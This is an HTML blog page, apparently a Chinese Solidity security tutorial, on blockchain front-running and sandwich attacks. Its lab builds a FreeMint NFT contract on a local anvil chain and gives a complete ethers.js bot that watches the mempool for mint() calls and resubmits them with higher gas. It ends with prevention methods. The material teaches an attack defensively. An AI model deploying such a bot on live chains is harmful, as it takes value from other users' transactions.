@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      33.抢先交易_2 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">33.抢先交易_2</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-01 15:03:19
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/" title="09.安全审计">
+                    <b>#</b> 09.安全审计
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="抢先交易-2"><a href="#抢先交易-2" class="headerlink" title="抢先交易_2"></a>抢先交易_2</h1><p>这一讲，我们将介绍智能合约的抢先交易（Front-running，抢跑）。据统计，以太坊上的套利者通过三明治攻击（sandwich attack）<a target="_blank" rel="noopener" href="https://dune.com/chorus_one/ethereum-mev-data">共获利$12亿</a>。</p>
+<h2 id="Front-running"><a href="#Front-running" class="headerlink" title="Front-running"></a>Front-running</h2><h3 id="传统抢跑"><a href="#传统抢跑" class="headerlink" title="传统抢跑"></a>传统抢跑</h3><p>抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。</p>
+<p>2021 年 9 月，NFT 市场 OpenSea 的产品负责人 Nate Chastain，被发现通过抢先购买将在 OpenSea 首页展示的 NFT 获利。 他利用内幕信息来获得不公平的信息差，OpenSea 将要在首页推送哪些 NFT，然后在展出在首页前抢先买入，然后再在 NFT 登上首页后卖出。然而，有一个人通过将 NFT 交易时间戳与 OpenSea 上有问题的 NFT 的首页促销进行匹配，发现了这一非法行为，Nate 也被告上法院。</p>
+<p>另一个传统抢跑的例子包括是在代币上<a target="_blank" rel="noopener" href="https://www.wsj.com/articles/crypto-might-have-an-insider-trading-problem-11653084398?mod=hp_lista_pos4">币安</a>/<a target="_blank" rel="noopener" href="https://www.protocol.com/fintech/coinbase-crypto-insider-trading">coinbase</a>等知名交易所之前，会有得知内幕消息的老鼠仓提前买入。在上币的公告发出后，币价会大幅上涨，这时抢跑者会卖出盈利。</p>
+<h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p>
+<p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p>
+<p><img src="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-1.png" alt="img"></p>
+<h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p>
+<ul>
+<li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a target="_blank" rel="noopener" href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li>
+<li><code>remix</code>进行NFT合约的部署和铸造</li>
+<li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li>
+</ul>
+<p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p>
+<p><img src="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-2.png" alt="img"></p>
+<p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p>
+<p><img src="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-3.png" alt="img"></p>
+<p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// By 0xAA</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 我们尝试frontrun一笔Free mint交易</span><br><span class="line">contract FreeMint is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;Free Mint NFT&quot;, &quot;FreeMint&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        _mint(msg.sender, totalSupply); // mint</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。如果你不熟悉<code>ether.js</code>，可以阅读<a target="_blank" rel="noopener" href="https://github.com/WTFAcademy/WTF-Ethers">WTF Ethers极简教程</a>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// provider.on(&quot;pending&quot;, listener)</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers, utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建provider</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://127.0.0.1:8545&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">WebSocketProvider</span>(url);</span><br><span class="line"><span class="keyword">let</span> network = provider.<span class="title function_">getNetwork</span>()</span><br><span class="line">network.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 连接到 chain ID <span class="subst">$&#123;res.chainId&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建interface对象，用于解码交易详情。</span></span><br><span class="line"><span class="keyword">const</span> iface = <span class="keyword">new</span> utils.<span class="title class_">Interface</span>([</span><br><span class="line">    <span class="string">&quot;function mint() external&quot;</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建钱包，用于发送抢跑交易</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&#x27;0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a&#x27;</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey, provider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 4. 监听pending的mint交易，获取交易详情，然后解码。</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n4. 监听pending交易，获取txHash，并输出交易详情。&quot;</span>)</span><br><span class="line">    provider.<span class="title function_">on</span>(<span class="string">&quot;pending&quot;</span>, <span class="keyword">async</span> (txHash) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (txHash) &#123;</span><br><span class="line">            <span class="comment">// 获取tx详情</span></span><br><span class="line">            <span class="keyword">let</span> tx = <span class="keyword">await</span> provider.<span class="title function_">getTransaction</span>(txHash);</span><br><span class="line">            <span class="keyword">if</span> (tx) &#123;</span><br><span class="line">                <span class="comment">// filter pendingTx.data</span></span><br><span class="line">                <span class="keyword">if</span> (tx.<span class="property">data</span>.<span class="title function_">indexOf</span>(iface.<span class="title function_">getSighash</span>(<span class="string">&quot;mint&quot;</span>)) !== -<span class="number">1</span> &amp;&amp; tx.<span class="property">from</span> != wallet.<span class="property">address</span> ) &#123;</span><br><span class="line">                    <span class="comment">// 打印txHash</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\n[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 监听Pending交易: <span class="subst">$&#123;txHash&#125;</span> \r`</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 打印解码的交易详情</span></span><br><span class="line">                    <span class="keyword">let</span> parsedTx = iface.<span class="title function_">parseTransaction</span>(tx)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pending交易详情解码：&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(parsedTx);</span><br><span class="line">                    <span class="comment">// Input data解码</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;raw transaction&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(tx);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 构建抢跑tx</span></span><br><span class="line">                    <span class="keyword">const</span> txFrontrun = &#123;</span><br><span class="line">                        <span class="attr">to</span>: tx.<span class="property">to</span>,</span><br><span class="line">                        <span class="attr">value</span>: tx.<span class="property">value</span>,</span><br><span class="line">                        <span class="attr">maxPriorityFeePerGas</span>: tx.<span class="property">maxPriorityFeePerGas</span> * <span class="number">1.2</span>,</span><br><span class="line">                        <span class="attr">maxFeePerGas</span>: tx.<span class="property">maxFeePerGas</span> * <span class="number">1.2</span>,</span><br><span class="line">                        <span class="attr">gasLimit</span>: tx.<span class="property">gasLimit</span> * <span class="number">2</span>,</span><br><span class="line">                        <span class="attr">data</span>: tx.<span class="property">data</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 发送抢跑交易</span></span><br><span class="line">                    <span class="keyword">var</span> txResponse = <span class="keyword">await</span> wallet.<span class="title function_">sendTransaction</span>(txFrontrun)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`正在frontrun交易`</span>)</span><br><span class="line">                    <span class="keyword">await</span> txResponse.<span class="title function_">wait</span>()</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`frontrun 交易成功`</span>)                </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    provider.<span class="property">_websocket</span>.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Unable to connect to <span class="subst">$&#123;ep.subdomain&#125;</span> retrying in 3s...`</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(init, <span class="number">3000</span>);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    provider.<span class="property">_websocket</span>.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, <span class="keyword">async</span> (code) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">            <span class="string">`Connection lost with code <span class="subst">$&#123;code&#125;</span>! Attempting reconnect in 3s...`</span></span><br><span class="line">        );</span><br><span class="line">        provider.<span class="property">_websocket</span>.<span class="title function_">terminate</span>();</span><br><span class="line">        <span class="built_in">setTimeout</span>(init, <span class="number">3000</span>);</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
+<p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p>
+<p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p>
+<p><img src="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/S11-4.png" alt="img"></p>
+<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p>
+<ul>
+<li>使用预提交方案(commit-reveal scheme)。</li>
+<li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了以太坊的抢先交易，也叫抢跑。这种起源于传统金融行业的攻击模式在区块链中更容易实施，因为所有的交易信息都是公开的。我们做了一个抢跑的时间：抢跑一笔铸造 NFT 的交易。当需要有类似的交易时，最好支持隐藏的内存池，或者实施批量拍卖等措施限制。它是以太坊等公链上普遍存在的问题，我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/32.%E8%B2%94%E8%B2%85/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-01 15:03:19
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/09-%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/" title="09.安全审计">
+                        <b>#</b> 09.安全审计
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/06/01/09.%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/35.%E6%93%8D%E7%BA%B5%E5%8C%BA%E5%9D%97%E6%97%B6%E9%97%B4/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93-2"><span class="toc-text">抢先交易_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Front-running"><span class="toc-text">Front-running</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%8A%A2%E8%B7%91"><span class="toc-text">传统抢跑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E4%B8%8A%E6%8A%A2%E8%B7%91"><span class="toc-text">链上抢跑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A2%E8%B7%91%E5%AE%9E%E8%B7%B5"><span class="toc-text">抢跑实践</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2%E6%96%B9%E6%B3%95"><span class="toc-text">预防方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
